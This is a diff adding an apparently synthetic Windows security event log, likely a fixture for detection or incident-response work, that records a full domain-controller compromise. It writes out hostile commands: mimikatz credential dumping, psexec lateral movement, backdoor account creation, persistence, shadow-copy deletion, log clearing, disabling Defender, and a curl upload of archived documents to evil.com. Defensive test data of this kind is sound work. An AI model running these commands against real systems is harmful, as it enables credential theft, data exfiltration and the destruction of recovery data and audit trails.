@@ -1,0 +1,35 @@
+2025-03-15 09:00:00, Info SECURITY EventID=4624 | Logon Success | User=CORP\jsmith | LogonType=2 | IP=10.0.0.100 | Computer=WORKSTATION01
+2025-03-15 09:00:05, Info SECURITY EventID=4672 | Special privileges assigned to new logon | User=CORP\jsmith | Computer=WORKSTATION01
+2025-03-15 09:01:00, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:01, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:02, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:03, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:04, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:05, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:06, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:07, Error SECURITY EventID=4625 | Logon Failure | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01 | FailureReason=BadPassword
+2025-03-15 09:01:30, Warning SECURITY EventID=4624 | Logon Success | User=CORP\admin | LogonType=3 | IP=203.0.113.45 | Computer=DC01
+2025-03-15 09:02:00, Info SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=powershell.exe | CommandLine=powershell.exe -nop -w hidden -encodedcommand JABjAD0= | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:02:30, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=mimikatz.exe | CommandLine=mimikatz.exe sekurlsa::logonpasswords | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:03:00, Info SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=cmd.exe | CommandLine=cmd.exe /c whoami /all | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:03:10, Info SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=cmd.exe | CommandLine=cmd.exe /c net user /domain | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:03:20, Info SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=cmd.exe | CommandLine=cmd.exe /c net group "Domain Admins" /domain | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:03:30, Info SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=cmd.exe | CommandLine=cmd.exe /c net view /domain | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:03:40, Info SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=cmd.exe | CommandLine=cmd.exe /c netstat -an | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:03:50, Info SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=cmd.exe | CommandLine=cmd.exe /c tasklist /v | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:04:00, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=psexec.exe | CommandLine=psexec.exe \\FILESERVER01 -u CORP\admin cmd.exe | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:04:30, Warning SECURITY EventID=4624 | Logon Success | User=CORP\admin | LogonType=3 | IP=10.0.0.5 | Computer=FILESERVER01
+2025-03-15 09:05:00, Critical SECURITY EventID=4732 | Member Added to Security Group | Group=Administrators | User=CORP\backdoor | AddedBy=CORP\admin | Computer=DC01
+2025-03-15 09:05:30, Warning SECURITY EventID=4720 | User Account Created | User=CORP\backdoor | CreatedBy=CORP\admin | Computer=DC01
+2025-03-15 09:06:00, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=cmd.exe | CommandLine=cmd.exe /c net user backdoor P@ssw0rd123! /add /domain | ParentProcess=powershell.exe | Computer=DC01
+2025-03-15 09:06:30, Warning SECURITY EventID=7045 | Service Installed | ServiceName=EvilSvc | ServicePath=C:\Windows\Temp\svchost.exe | Computer=DC01
+2025-03-15 09:07:00, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=schtasks.exe | CommandLine=schtasks /create /sc minute /mo 5 /tn SysUpdate /tr C:\Windows\Temp\svchost.exe | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:07:30, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=reg.exe | CommandLine=reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SysUpdate /t REG_SZ /d C:\Windows\Temp\svchost.exe /f | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:08:00, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=vssadmin.exe | CommandLine=vssadmin.exe delete shadows /all /quiet | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:08:30, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=bcdedit.exe | CommandLine=bcdedit.exe /set {default} recoveryenabled no | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:09:00, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=wevtutil.exe | CommandLine=wevtutil.exe cl Security | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:09:01, Critical SECURITY EventID=1102 | The audit log was cleared | User=CORP\admin | Computer=DC01
+2025-03-15 09:10:00, Warning SECURITY EventID=4688 | Process Created | User=SYSTEM | Process=svchost.exe | CommandLine=C:\Windows\Temp\svchost.exe -service | ParentProcess=services.exe | Computer=DC01
+2025-03-15 09:10:30, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=powershell.exe | CommandLine=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:11:00, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=7z.exe | CommandLine=7z.exe a -pSecretKey C:\Windows\Temp\exfil.7z C:\Users\*\Documents\*.* | ParentProcess=cmd.exe | Computer=DC01
+2025-03-15 09:11:30, Warning SECURITY EventID=4688 | Process Created | User=CORP\admin | Process=curl.exe | CommandLine=curl.exe -X POST -F file=@C:\Windows\Temp\exfil.7z https://evil.com/upload | ParentProcess=cmd.exe | Computer=DC01
